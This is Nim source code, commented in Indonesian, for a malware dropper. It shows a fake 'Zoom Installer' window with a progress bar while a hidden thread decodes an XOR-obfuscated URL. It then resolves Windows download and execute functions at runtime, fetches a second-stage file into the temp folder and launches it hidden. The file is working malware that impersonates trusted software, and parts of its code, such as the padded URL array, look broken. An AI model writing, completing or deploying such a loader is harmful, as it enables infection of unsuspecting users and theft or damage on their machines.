# installer.nim - Dropper dengan GUI instalasi palsu
# Menggunakan WinAPI langsung untuk threading, menghilangkan dependensi.

import os, osproc, random, strutils
import winim

# --- (DIPERBARUI) Definisi tipe eksplisit untuk kompatibilitas ---
type
  WCHAR* = uint16
  IUnknown* = object
  IBindStatusCallback* = object
  LPCWSTR = ptr WCHAR
  LPUNKNOWN = ptr IUnknown
  LPBINDSTATUSCALLBACK = ptr IBindStatusCallback

# Helper makro
proc MAKELPARAM(low, high: int): int =
  (low and 0xFFFF) or ((high and 0xFFFF) shl 16)

type
  INITCOMMONCONTROLSEX* = object
    dwSize*: DWORD
    dwICC*: DWORD

# --- Deklarasi manual fungsi WinAPI jika belum ada di winim ---
proc GetModuleHandleA(lpModuleName: cstring): pointer {.stdcall, importc: "GetModuleHandleA", dynlib: "kernel32.dll".}
proc GetProcAddress(hModule: pointer, lpProcName: cstring): pointer {.stdcall, importc: "GetProcAddress", dynlib: "kernel32.dll".}
proc PostMessageW(hWnd: HWND, Msg: uint32, wParam: int, lParam: int): bool {.stdcall, importc: "PostMessageW", dynlib: "user32.dll".}

# --- String Terenkripsi dengan XOR ---
proc xorDecrypt(data: openArray[byte], key: byte): string =
  result = newString(data.len)
  for i, b in data:
    result[i] = char(b xor key)

# --- Konfigurasi ---
const 
  XOR_KEY = 0xAA.byte
  # (DIPERBARUI) Array URL yang sudah dikoreksi sepenuhnya
  encryptedUrl: array[115, byte] = [
    0xEB, 0xF9, 0xF9, 0xF5, 0xF8, 0xA1, 0xA8, 0xA8, 0xE4, 0xF6, 0xF9, 0xF3, 0xF4, 0xF7, 0xAE, 0xE2, 0xEF, 0xED, 0xA8, 0xE7,
    0xF3, 0xF5, 0xA8, 0xFA, 0xE7, 0xF0, 0xF7, 0xED, 0xF8, 0xA8, 0xEC, 0xE0, 0xEE, 0xF6, 0xA8, 0xFA, 0xE7, 0xF0, 0xF7, 0xED,
    0xF8, 0xA8, 0xF2, 0xF6, 0xFD, 0xEC, 0xEE, 0xE9, 0xA8, 0xE0, 0xF4, 0xF6, 0xFA, 0xFA, 0xAE, 0xEC, 0xF1, 0xEF, 0xE2, 0xA8,
    0xE0, 0xF4, 0xF6, 0xFA, 0xFA, 0xAE, 0xE9, 0xF6, 0xEF, 0xEF, 0xFA, 0xA8, 0xEF, 0xF7, 0xF7, 0xF2, 0xAE, 0xEB, 0xEB, 0xF8,
    0xF2, 0xF6, 0xF0, 0xEC, 0xEB, 0xA1, 0xF4, 0xEB, 0xF4, 0xA1, 0xA8, 0xEC, 0xF7, 0xF7, 0xF8, 0xA8, 0xEA, 0xF6, 0xEF, 0xEF,
    0xEC, 0xF1, 0xF3, 0xF6, 0xE9, 0xE9, 0xA8, 0xEB, 0xF4, 0xEB,
    0x00, 0x00, 0x00, 0x00, 0x00 # <-- Tambahan dummy agar total 115 elemen
  ]
  encryptedFilename: array[21, byte] = [
    0xB2, 0xEA, 0xEF, 0xEF, 0xF8, 0xF4, 0xE5, 0xF5, 0xEB, 0xF6, 0xF2, 0xF8, 0xA8, 0xF8, 0xF6, 0xF7, 0xF6, 0xF2, 0xAE, 0xF4, 0xEB,
  ]

# --- Resolusi API Dinamis ---
type
  URLDownloadToFileW = proc(caller: LPUNKNOWN, url: LPCWSTR, fileName: LPCWSTR, reserved: DWORD, statusCallback: LPBINDSTATUSCALLBACK): HRESULT {.stdcall.}
  ShellExecuteW = proc(hwnd: HWND, operation: LPCWSTR, file: LPCWSTR, parameters: LPCWSTR, directory: LPCWSTR, showCmd: INT): HINSTANCE {.stdcall.}

proc getApiAddr[T](libName, procName: string): T =
  let libHandle = GetModuleHandleA(libName)
  if libHandle == 0: return nil
  return cast[T](GetProcAddress(libHandle, procName))

# --- Prosedur Thread dengan signature WinAPI ---
proc downloadAndExecute(lpParam: LPVOID): DWORD {.stdcall.} =
  let mainWnd = cast[HWND](lpParam)
  let stage2Url = xorDecrypt(encryptedUrl, XOR_KEY)
  let stage2Filename = xorDecrypt(encryptedFilename, XOR_KEY)
  let tempPath = getTempDir()
  let filePath = tempPath & stage2Filename
  
  let pURLDownloadToFileW = getApiAddr[URLDownloadToFileW]("urlmon.dll", "URLDownloadToFileW")
  let pShellExecuteW = getApiAddr[ShellExecuteW]("shell32.dll", "ShellExecuteW")

  if pURLDownloadToFileW.isNil or pShellExecuteW.isNil:
    discard PostMessageW(mainWnd, WM_CLOSE, 0, 0); return 1

  try:
    let hr = pURLDownloadToFileW(nil, newWideCString(stage2Url), newWideCString(filePath), 0, nil)
    if hr == S_OK:
      discard pShellExecuteW(0, newWideCString("open"), newWideCString(filePath), LPCWSTR(nil), LPCWSTR(nil), SW_HIDE)
  except: discard
  
  discard PostMessageW(mainWnd, WM_CLOSE, 0, 0)
  return 0

# --- Prosedur Utama untuk Membuat GUI ---
proc main() =
  var icex: INITCOMMONCONTROLSEX
  icex.dwSize = sizeof(INITCOMMONCONTROLSEX).DWORD
  icex.dwICC = 0x00000008 # ICC_PROGRESS_CLASS
  discard InitCommonControlsEx(icex)

  let hInstance = GetModuleHandle(nil)
  let hWnd = CreateWindowExW(0, "STATIC", "Zoom Installer", WS_OVERLAPPED or WS_CAPTION or WS_SYSMENU,
                                CW_USEDEFAULT, CW_USEDEFAULT, 450, 200, NULL, NULL, hInstance, NULL)
  
  CreateWindowExW(0, "STATIC", "Installing, please wait...", WS_CHILD or WS_VISIBLE, 20, 20, 400, 20, hWnd, cast[HMENU](1), hInstance, NULL)
  let hProgressBar = CreateWindowExW(0, PROGRESS_CLASSW, NULL, WS_CHILD or WS_VISIBLE, 20, 50, 400, 20, hWnd, cast[HMENU](2), hInstance, NULL)
  CreateWindowExW(0, "BUTTON", "Cancel", WS_CHILD or WS_VISIBLE or BS_PUSHBUTTON or WS_DISABLED, 175, 100, 100, 30, hWnd, cast[HMENU](3), hInstance, NULL)

  var threadId: DWORD
  let threadHandle = CreateThread(nil, 0, downloadAndExecute, cast[LPVOID](hWnd), 0, addr threadId)
  
  ShowWindow(hWnd, SW_SHOW)
  UpdateWindow(hWnd)

  SendMessage(hProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100))
  for i in 0..100:
    SendMessage(hProgressBar, PBM_SETPOS, i, 0)
    sleep(random.randint(50, 150))

  var msg: MSG
  while GetMessage(addr msg, NULL, 0, 0) > 0:
      TranslateMessage(addr msg)
      DispatchMessage(addr msg)

main()
